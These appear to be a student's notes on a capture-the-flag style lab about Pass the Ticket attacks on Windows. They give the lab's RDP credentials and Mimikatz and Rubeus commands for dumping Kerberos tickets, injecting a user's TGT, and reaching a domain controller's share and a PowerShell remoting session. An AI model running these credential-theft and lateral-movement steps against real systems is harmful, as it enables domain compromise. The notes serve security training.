# [[Pass the Ticket (PtT) from Windows]]

### ### Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?

```shell
xfreerdp3 /u:'Administrator' /p:'AnotherC0mpl3xP4$$' /v:10.129.204.23
```

```cmd 
privilege::debug  
sekurlsa::tickets /export
```
![[Screenshot 2026-05-11 at 13.26.31.png]]
### Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\DC01.inlanefreight.htb\john

```cmd
mimikatz.exe  
privilege::debug  
kerberos::ptt "C:\Users\Administrator\Desktop\[0;5b0ba]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"  
exit  
dir \\DC01.inlanefreight.htb\john
```
![[Pasted image 20260511134119.png]]

```cmd
type \\DC01.inlanefreight.htb\john\john.txt
```
### Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt

```cmd
powershell  
whoami
```
![[Pasted image 20260511134146.png]]
```powershell
Enter-PSSession -ComputerName DC01  
whoami
```

```powershell
type C:\john\john.txt
```
___
### Optional: Try to use both tools, Mimikatz and Rubeus, to perform the attacks without relying on each other. Mark DONE when finish.

```cmd
Rubeus.exe dump --nowrap
```

```cmd
Rubeus.exe ptt ticket:<base64>
```
![[Screenshot 2026-05-11 at 13.52.20.png]]
